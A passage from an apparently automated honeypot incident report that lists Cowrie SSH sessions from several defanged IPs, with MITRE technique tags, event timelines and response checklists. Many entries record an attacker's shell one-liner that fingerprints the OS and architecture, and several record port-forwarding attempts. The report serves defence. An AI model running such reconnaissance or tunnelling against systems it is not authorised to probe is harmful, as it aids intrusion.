- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaf541d3e490

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:21 |
| **Last Seen** | 2026-07-31 19:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:21:37` | `cowrie.session.connect` |
| `2026-07-31 19:21:37` | `cowrie.client.version` |
| `2026-07-31 19:21:37` | `cowrie.client.kex` |
| `2026-07-31 19:21:38` | `cowrie.login.success` |
| `2026-07-31 19:21:40` | `cowrie.session.params` |
| `2026-07-31 19:21:40` | `cowrie.command.input` |
| `2026-07-31 19:21:40` | `cowrie.command.input` |
| `2026-07-31 19:21:40` | `cowrie.command.input` |
| `2026-07-31 19:21:40` | `cowrie.command.input` |
| `2026-07-31 19:21:40` | `cowrie.command.input` |
| `2026-07-31 19:21:40` | `cowrie.command.success` |
| `2026-07-31 19:21:40` | `cowrie.command.input` |
| `2026-07-31 19:21:40` | `cowrie.command.input` |
| `2026-07-31 19:21:40` | `cowrie.command.input` |
| `2026-07-31 19:21:40` | `cowrie.command.input` |
| `2026-07-31 19:21:40` | `cowrie.log.closed` |
| `2026-07-31 19:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-003c426b99ae

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 19:21 |
| **Last Seen** | 2026-07-31 19:21 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:21:42` | `cowrie.session.connect` |
| `2026-07-31 19:21:43` | `cowrie.client.version` |
| `2026-07-31 19:21:43` | `cowrie.client.kex` |
| `2026-07-31 19:21:49` | `cowrie.login.success` |
| `2026-07-31 19:21:51` | `cowrie.session.params` |
| `2026-07-31 19:21:51` | `cowrie.command.input` |
| `2026-07-31 19:21:51` | `cowrie.command.input` |
| `2026-07-31 19:21:51` | `cowrie.command.input` |
| `2026-07-31 19:21:51` | `cowrie.command.input` |
| `2026-07-31 19:21:51` | `cowrie.command.input` |
| `2026-07-31 19:21:51` | `cowrie.command.success` |
| `2026-07-31 19:21:51` | `cowrie.command.input` |
| `2026-07-31 19:21:51` | `cowrie.command.input` |
| `2026-07-31 19:21:52` | `cowrie.command.input` |
| `2026-07-31 19:21:52` | `cowrie.command.input` |
| `2026-07-31 19:21:53` | `cowrie.log.closed` |
| `2026-07-31 19:21:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c872c4214144

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:23 |
| **Last Seen** | 2026-07-31 19:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:23:34` | `cowrie.session.connect` |
| `2026-07-31 19:23:34` | `cowrie.client.version` |
| `2026-07-31 19:23:34` | `cowrie.client.kex` |
| `2026-07-31 19:23:35` | `cowrie.login.success` |
| `2026-07-31 19:23:36` | `cowrie.session.params` |
| `2026-07-31 19:23:36` | `cowrie.command.input` |
| `2026-07-31 19:23:36` | `cowrie.command.input` |
| `2026-07-31 19:23:36` | `cowrie.command.input` |
| `2026-07-31 19:23:36` | `cowrie.command.input` |
| `2026-07-31 19:23:36` | `cowrie.command.input` |
| `2026-07-31 19:23:36` | `cowrie.command.success` |
| `2026-07-31 19:23:36` | `cowrie.command.input` |
| `2026-07-31 19:23:36` | `cowrie.command.input` |
| `2026-07-31 19:23:36` | `cowrie.command.input` |
| `2026-07-31 19:23:36` | `cowrie.command.input` |
| `2026-07-31 19:23:37` | `cowrie.log.closed` |
| `2026-07-31 19:23:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e3ab39a400e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 19:24 |
| **Last Seen** | 2026-07-31 19:25 |
| **Session Duration** | 62s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:24:41` | `cowrie.session.connect` |
| `2026-07-31 19:24:43` | `cowrie.client.version` |
| `2026-07-31 19:24:43` | `cowrie.client.kex` |
| `2026-07-31 19:25:01` | `cowrie.login.success` |
| `2026-07-31 19:25:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e3319f02956

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:25 |
| **Last Seen** | 2026-07-31 19:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:25:31` | `cowrie.session.connect` |
| `2026-07-31 19:25:31` | `cowrie.client.version` |
| `2026-07-31 19:25:31` | `cowrie.client.kex` |
| `2026-07-31 19:25:32` | `cowrie.login.success` |
| `2026-07-31 19:25:34` | `cowrie.session.params` |
| `2026-07-31 19:25:34` | `cowrie.command.input` |
| `2026-07-31 19:25:34` | `cowrie.command.input` |
| `2026-07-31 19:25:34` | `cowrie.command.input` |
| `2026-07-31 19:25:34` | `cowrie.command.input` |
| `2026-07-31 19:25:34` | `cowrie.command.input` |
| `2026-07-31 19:25:34` | `cowrie.command.success` |
| `2026-07-31 19:25:34` | `cowrie.command.input` |
| `2026-07-31 19:25:34` | `cowrie.command.input` |
| `2026-07-31 19:25:34` | `cowrie.command.input` |
| `2026-07-31 19:25:34` | `cowrie.command.input` |
| `2026-07-31 19:25:34` | `cowrie.log.closed` |
| `2026-07-31 19:25:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e20ef3fe579

| Field | Detail |
|---|---|
| **Source IP** | `141.253.107[.]23` |
| **First Seen** | 2026-07-31 19:27 |
| **Last Seen** | 2026-07-31 19:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:27:32` | `cowrie.session.connect` |
| `2026-07-31 19:27:32` | `cowrie.client.version` |
| `2026-07-31 19:27:32` | `cowrie.client.kex` |
| `2026-07-31 19:27:33` | `cowrie.login.success` |
| `2026-07-31 19:27:33` | `cowrie.session.params` |
| `2026-07-31 19:27:33` | `cowrie.command.input` |
| `2026-07-31 19:27:33` | `cowrie.log.closed` |
| `2026-07-31 19:27:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.253.107[.]23` to AbuseIPDB if not already reported
- [ ] Block `141.253.107[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cb86750efcd

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:27 |
| **Last Seen** | 2026-07-31 19:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:27:52` | `cowrie.session.connect` |
| `2026-07-31 19:27:52` | `cowrie.client.version` |
| `2026-07-31 19:27:52` | `cowrie.client.kex` |
| `2026-07-31 19:27:54` | `cowrie.login.success` |
| `2026-07-31 19:27:55` | `cowrie.session.params` |
| `2026-07-31 19:27:55` | `cowrie.command.input` |
| `2026-07-31 19:27:55` | `cowrie.command.input` |
| `2026-07-31 19:27:55` | `cowrie.command.input` |
| `2026-07-31 19:27:55` | `cowrie.command.input` |
| `2026-07-31 19:27:55` | `cowrie.command.input` |
| `2026-07-31 19:27:55` | `cowrie.command.success` |
| `2026-07-31 19:27:55` | `cowrie.command.input` |
| `2026-07-31 19:27:55` | `cowrie.command.input` |
| `2026-07-31 19:27:55` | `cowrie.command.input` |
| `2026-07-31 19:27:55` | `cowrie.command.input` |
| `2026-07-31 19:27:55` | `cowrie.log.closed` |
| `2026-07-31 19:27:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3af603ae60f

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-31 19:28 |
| **Last Seen** | 2026-07-31 19:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:28:15` | `cowrie.session.connect` |
| `2026-07-31 19:28:15` | `cowrie.client.version` |
| `2026-07-31 19:28:15` | `cowrie.client.kex` |
| `2026-07-31 19:28:15` | `cowrie.login.success` |
| `2026-07-31 19:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-121baaec1dac

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-31 19:28 |
| **Last Seen** | 2026-07-31 19:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:28:17` | `cowrie.session.connect` |
| `2026-07-31 19:28:17` | `cowrie.client.version` |
| `2026-07-31 19:28:17` | `cowrie.client.kex` |
| `2026-07-31 19:28:17` | `cowrie.login.success` |
| `2026-07-31 19:28:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-feb29dba4854

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-31 19:28 |
| **Last Seen** | 2026-07-31 19:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:28:22` | `cowrie.session.connect` |
| `2026-07-31 19:28:22` | `cowrie.client.version` |
| `2026-07-31 19:28:22` | `cowrie.client.kex` |
| `2026-07-31 19:28:23` | `cowrie.login.success` |
| `2026-07-31 19:28:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d1652afcf2b

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-31 19:28 |
| **Last Seen** | 2026-07-31 19:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:28:23` | `cowrie.session.connect` |
| `2026-07-31 19:28:23` | `cowrie.client.version` |
| `2026-07-31 19:28:23` | `cowrie.client.kex` |
| `2026-07-31 19:28:24` | `cowrie.login.success` |
| `2026-07-31 19:28:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78b99bc29fdc

| Field | Detail |
|---|---|
| **Source IP** | `187.218.57[.]50` |
| **First Seen** | 2026-07-31 19:29 |
| **Last Seen** | 2026-07-31 19:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:29:21` | `cowrie.session.connect` |
| `2026-07-31 19:29:22` | `cowrie.client.version` |
| `2026-07-31 19:29:22` | `cowrie.client.kex` |
| `2026-07-31 19:29:23` | `cowrie.login.success` |
| `2026-07-31 19:29:24` | `cowrie.direct-tcpip.request` |
| `2026-07-31 19:29:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.218.57[.]50` to AbuseIPDB if not already reported
- [ ] Block `187.218.57[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9186d574562

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:29 |
| **Last Seen** | 2026-07-31 19:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:29:47` | `cowrie.session.connect` |
| `2026-07-31 19:29:47` | `cowrie.client.version` |
| `2026-07-31 19:29:47` | `cowrie.client.kex` |
| `2026-07-31 19:29:49` | `cowrie.login.success` |
| `2026-07-31 19:29:50` | `cowrie.session.params` |
| `2026-07-31 19:29:50` | `cowrie.command.input` |
| `2026-07-31 19:29:50` | `cowrie.command.input` |
| `2026-07-31 19:29:50` | `cowrie.command.input` |
| `2026-07-31 19:29:50` | `cowrie.command.input` |
| `2026-07-31 19:29:50` | `cowrie.command.input` |
| `2026-07-31 19:29:50` | `cowrie.command.success` |
| `2026-07-31 19:29:50` | `cowrie.command.input` |
| `2026-07-31 19:29:50` | `cowrie.command.input` |
| `2026-07-31 19:29:50` | `cowrie.command.input` |
| `2026-07-31 19:29:50` | `cowrie.command.input` |
| `2026-07-31 19:29:50` | `cowrie.log.closed` |
| `2026-07-31 19:29:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bb684f37d8d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:32 |
| **Last Seen** | 2026-07-31 19:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:32:13` | `cowrie.session.connect` |
| `2026-07-31 19:32:14` | `cowrie.client.version` |
| `2026-07-31 19:32:14` | `cowrie.client.kex` |
| `2026-07-31 19:32:15` | `cowrie.login.success` |
| `2026-07-31 19:32:17` | `cowrie.session.params` |
| `2026-07-31 19:32:17` | `cowrie.command.input` |
| `2026-07-31 19:32:17` | `cowrie.command.input` |
| `2026-07-31 19:32:17` | `cowrie.command.input` |
| `2026-07-31 19:32:17` | `cowrie.command.input` |
| `2026-07-31 19:32:17` | `cowrie.command.input` |
| `2026-07-31 19:32:17` | `cowrie.command.success` |
| `2026-07-31 19:32:17` | `cowrie.command.input` |
| `2026-07-31 19:32:17` | `cowrie.command.input` |
| `2026-07-31 19:32:17` | `cowrie.command.input` |
| `2026-07-31 19:32:17` | `cowrie.command.input` |
| `2026-07-31 19:32:17` | `cowrie.log.closed` |
| `2026-07-31 19:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bac6c5d115b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:34 |
| **Last Seen** | 2026-07-31 19:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:34:06` | `cowrie.session.connect` |
| `2026-07-31 19:34:06` | `cowrie.client.version` |
| `2026-07-31 19:34:06` | `cowrie.client.kex` |
| `2026-07-31 19:34:07` | `cowrie.login.success` |
| `2026-07-31 19:34:09` | `cowrie.session.params` |
| `2026-07-31 19:34:09` | `cowrie.command.input` |
| `2026-07-31 19:34:09` | `cowrie.command.input` |
| `2026-07-31 19:34:09` | `cowrie.command.input` |
| `2026-07-31 19:34:09` | `cowrie.command.input` |
| `2026-07-31 19:34:09` | `cowrie.command.input` |
| `2026-07-31 19:34:09` | `cowrie.command.success` |
| `2026-07-31 19:34:09` | `cowrie.command.input` |
| `2026-07-31 19:34:09` | `cowrie.command.input` |
| `2026-07-31 19:34:09` | `cowrie.command.input` |
| `2026-07-31 19:34:09` | `cowrie.command.input` |
| `2026-07-31 19:34:09` | `cowrie.log.closed` |
| `2026-07-31 19:34:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45819638d64d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:36 |
| **Last Seen** | 2026-07-31 19:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:36:55` | `cowrie.session.connect` |
| `2026-07-31 19:36:55` | `cowrie.client.version` |
| `2026-07-31 19:36:55` | `cowrie.client.kex` |
| `2026-07-31 19:36:57` | `cowrie.login.success` |
| `2026-07-31 19:36:58` | `cowrie.session.params` |
| `2026-07-31 19:36:58` | `cowrie.command.input` |
| `2026-07-31 19:36:58` | `cowrie.command.input` |
| `2026-07-31 19:36:58` | `cowrie.command.input` |
| `2026-07-31 19:36:58` | `cowrie.command.input` |
| `2026-07-31 19:36:58` | `cowrie.command.input` |
| `2026-07-31 19:36:58` | `cowrie.command.success` |
| `2026-07-31 19:36:58` | `cowrie.command.input` |
| `2026-07-31 19:36:58` | `cowrie.command.input` |
| `2026-07-31 19:36:58` | `cowrie.command.input` |
| `2026-07-31 19:36:58` | `cowrie.command.input` |
| `2026-07-31 19:36:59` | `cowrie.log.closed` |
| `2026-07-31 19:36:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afb74712774f

| Field | Detail |
|---|---|
| **Source IP** | `134.122.85[.]36` |
| **First Seen** | 2026-07-31 19:37 |
| **Last Seen** | 2026-07-31 19:37 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:37:10` | `cowrie.session.connect` |
| `2026-07-31 19:37:16` | `cowrie.login.success` |
| `2026-07-31 19:37:17` | `cowrie.session.params` |
| `2026-07-31 19:37:21` | `cowrie.log.closed` |
| `2026-07-31 19:37:21` | `cowrie.session.closed` |

**Recommended Actions:**
